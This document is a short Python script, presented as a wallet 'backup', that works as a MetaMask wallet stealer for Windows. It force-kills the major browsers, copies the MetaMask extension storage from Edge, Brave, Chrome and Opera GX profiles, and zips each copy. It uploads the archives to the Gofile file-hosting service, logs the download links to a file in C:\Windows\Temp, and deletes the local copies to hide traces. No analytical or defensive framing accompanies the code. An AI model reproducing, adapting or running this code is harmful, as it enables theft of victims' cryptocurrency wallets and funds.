import os
import json
import requests
import zipfile

user = os.path.expanduser("~")

def kill_browser_processes():
    browsers = ["chrome.exe", "msedge.exe", "firefox.exe", "opera.exe", "brave.exe"]
    for browser in browsers:
        os.system(f"taskkill /F /IM {browser} /T")

def get_best_server():
    response = requests.get("https://api.gofile.io/getServer")
    data = response.json()
    if data['status'] == 'ok':
        return data['data']['server']
    else:
        raise Exception("Failed to get a server from Gofile.")

def upload_file_to_gofile(file_path, server):
    upload_url = f"https://{server}.gofile.io/uploadFile"
    with open(file_path, 'rb') as f:
        files = {'file': (os.path.basename(file_path), f)}
        response = requests.post(upload_url, files=files)
    data = response.json()
    if data['status'] == 'ok':
        return data['data']['downloadPage']
    else:
        raise Exception("Failed to upload file to Gofile.")

def copy_directory(src, dst):
    if not os.path.exists(dst):
        os.makedirs(dst)
    for item in os.listdir(src):
        src_path = os.path.join(src, item)
        dst_path = os.path.join(dst, item)
        if os.path.isdir(src_path):
            copy_directory(src_path, dst_path)
        else:
            with open(src_path, 'rb') as f_read, open(dst_path, 'wb') as f_write:
                f_write.write(f_read.read())

def make(args, brow, results):
    kill_browser_processes()

    dest_path = os.path.join(user, f"AppData\\Local\\Temp\\Metamask_{brow}")
    zip_path = dest_path + ".zip"
    if os.path.exists(args):
        copy_directory(args, dest_path)

        with zipfile.ZipFile(zip_path, 'w') as zipf:
            for root, dirs, files in os.walk(dest_path):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), start=dest_path))

        # Get server and upload to Gofile
        server = get_best_server()
        download_page = upload_file_to_gofile(zip_path, server)

        # Add results to the output JSON
        results[brow] = {
            "download_link": download_page,
            "zip_path": zip_path
        }

        # Cleanup
        os.remove(zip_path)
        for root, dirs, files in os.walk(dest_path, topdown=False):
            for name in files:
                os.remove(os.path.join(root, name))
            for name in dirs:
                os.rmdir(os.path.join(root, name))
        os.rmdir(dest_path)

def backup_wallets():
    meta_paths = [
        [os.path.join(user, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\ejbalbakoplchlghecdalmeeeajnimhm"), "Edge"],
        [os.path.join(user, "AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Edge"],
        [os.path.join(user, "AppData\\Local\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Brave"],
        [os.path.join(user, "AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "Google"],
        [os.path.join(user, "AppData\\Roaming\\Opera Software\\Opera GX Stable\\Local Extension Settings\\nkbihfbeogaeaoehlefnkodbefgpgknn"), "OperaGX"]
    ]
    
    results = {}
    
    for path, browser in meta_paths:
        make(path, browser, results)
    
    # Save results to a JSON file
    with open("C:\\Windows\\Temp\\metamask.json", "w") as f:
        json.dump(results, f, indent=4)

backup_wallets()
